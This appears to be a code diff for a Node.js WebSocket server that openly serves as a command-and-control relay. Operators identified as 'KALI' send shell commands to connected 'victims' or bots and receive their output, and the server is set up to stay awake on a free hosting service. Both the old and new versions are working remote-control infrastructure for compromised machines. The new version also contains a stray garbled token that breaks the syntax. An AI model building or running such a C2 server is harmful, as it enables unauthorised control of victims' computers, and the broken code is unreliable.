@@ -1,74 +1,57 @@
+// index.js  – salve na raiz do repo, dê push pro Render
 const WebSocket = require('ws');
-const http = require('http');
+const http    = require('http');
 
-// Cria servidor HTTP básico para o Render não dormir
-const server = http.createServer((req, res) => { res.end("Shadow C2 Online"); });
-const wss = new WebSocket.Server({ server });
+const PORT    = process.env.PORT || 10000;
+const server  = http.createServer((_,r)=>r.end('OK'));
+const wss     = new WebSocket.Server({ server });
 
-// Armazena conexões: Kali (Mestre) e Vítimas
-let kali = null;
-const victims = new Map();
+const kali    = new Map();      // id → socket  (operadores)
+const bots    = new Map();      // id → socket  (vítimas)
 
-wss.on('connection', (ws, req) => {
-    // Pega o ID da URL (ex: ?id=DAVID ou ?id=KALI)
-    const params = new URLSearchParams(req.url.split('?')[1]);
-    const id = params.get('id');
+function cast(src, destMap, payload){
+  const msg = JSON.stringify(payload);
+  destMap.forEach((s,id)=>{
+    if(s.readyState===1) s.send(msg);
+  });
+}
 
-    if (id === 'KALI') {
-        kali = ws;
-        console.log("[!] CONTROLADOR (KALI) CONECTADO");
-        // Avisa o Kali quem já está online
-        victims.forEach((v_ws, v_id) => {
-            if(kali) kali.send(JSON.stringify({ type: 'new_victim', id: v_id }));
-        });
-    } else {
-        // É uma vítima
-        const victimId = id || `Alvo_${Math.random().toString(36).substr(2, 4)}`;
-        victims.set(victimId, ws);
-        console.log(`[+] NOVA VÍTIMA: ${victimId}`);
-        
-        // Avisa o Kali que chegou carne nova
-        if (kali && kali.readyState === WebSocket.OPEN) {
-            kali.send(JSON.stringify({ type: 'new_victim', id: victimId }));
-        }
+wss.on('connection', (ws, req)=>{
+  const p = new URLSearchParams(req.url.split('?')[1]);
+  const who = p.get('id');
+  if(!who) return ws.close();
 
-        ws.on('close', () => {
-            victims.delete(victimId);
-            if(kali) kali.send(JSON.stringify({ type: 'disconnect', id: victimId }));
-        });
-    }
-
-    ws.on('message', (message) => {
-        try {
-            const data = JSON.parse(message);
-
-            if (ws === kali) {
-                // KALI -> VÍTIMA
-                // Formato esperado: { "target": "DAVID", "cmd": "dir" }
-                const targetWs = victims.get(data.target);
-                if (targetWs && targetWs.readyState === WebSocket.OPEN) {
-                    targetWs.send(data.cmd); // Envia apenas o comando limpo
-                }
-            } else {
-                // VÍTIMA -> KALI
-                // A vítima manda apenas o resultado texto, nós empacotamos pro Kali
-                if (kali && kali.readyState === WebSocket.OPEN) {
-                    kali.send(JSON.stringify({ 
-                        type: 'response', 
-                        from: id, 
-                        result: data.result 
-                    }));
-                }
-            }
-        } catch (e) {
-            console.error("Erro de protocolo:", e.message);
-        }
+  if(who === 'KALI'){                       // operador
+    kali.set(ws, who);
+    bots.forEach((_,id)=>{
+      ws.send(JSON.stringify({type:'bot', stat:'online', id}));
     });
+  }else{                                    // vítima
+    bots.set(who, ws);
+    cast(ws, kali, {type:'bot', stat:'online', id:who});
+  }
+
+  ws.on('message', m=>{
+    try{
+      const j = JSON.parse(m);
+      if(kali.has(ws)){                     // KALI → BOT
+        const s = bots.get(j.to);
+        if(s && s.readyState===1) s.send(j.cmd);
+      }else{到北京                             // BOT → KALI
+        cast(ws, kali, {type:'res', from:who, data:j.out});
+      }
+    }catch{}
+  });
+
+  ws.on('close', (_, reason)=>{
+    if(kali.has(ws)){
+      kali.delete(ws);
+    }else{
+      bots.forEach((v,k)=> v===ws ? bots.delete(k) : 0);
+      cast(ws, kali, {type:'bot', stat:'gone', id:who});
+    }
+  });
 });
 
-// Ping para manter conexões vivas (Anti-Idle do Render)
-setInterval(() => {
-    wss.clients.forEach(ws => { if(ws.readyState === WebSocket.OPEN) ws.ping(); });
-}, 20000);
-
-server.listen(process.env.PORT || 10000);
+setInterval(()=> wss.clients.forEach(s=>s.ping()), 20000);
+server.listen(PORT, ()=>console.log('C2 up'));
